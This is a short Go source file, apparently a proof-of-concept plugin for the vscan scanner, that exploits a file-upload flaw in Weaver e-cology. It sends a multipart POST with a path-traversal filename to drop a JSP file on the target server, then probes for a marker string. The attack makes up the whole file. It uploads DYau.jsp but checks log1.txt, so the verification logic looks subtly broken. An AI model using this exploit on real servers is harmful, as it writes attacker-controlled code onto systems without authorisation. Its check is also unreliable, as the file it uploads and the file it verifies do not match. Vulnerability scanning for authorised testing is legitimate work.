package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Coloy_FileClient_upload(u string) bool {

	PocData := "----------1638451160\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"../../clusterupgrade/DYau.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print(\"202cb962ac59075b964b07152d234b70\");%>\r\n----------1638451160--"
	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=--------1638451160"
	header["Accept"] = "*"
	if req, err := pkg.HttpRequset(u+"/clusterupgrade/uploadFileClient.jsp", "POST", PocData, false, header); err == nil {
		if req.StatusCode == 200 {
			if req1, err := pkg.HttpRequset(u+"/clusterupgrade/log1.txt", "GET", "", false, nil); err == nil {
				if req1.StatusCode == 200 && strings.Contains(req1.Body, "202cb962ac59075b964b07152d234b70") {
					pkg.GoPocLog(fmt.Sprintf("Found vuln weaver Weaver_e_cology_FileClient_upload!|%s\n", u+"/clusterupgrade/log1.txt"))
					return true
				}
			}
		}
	}
	return false
}
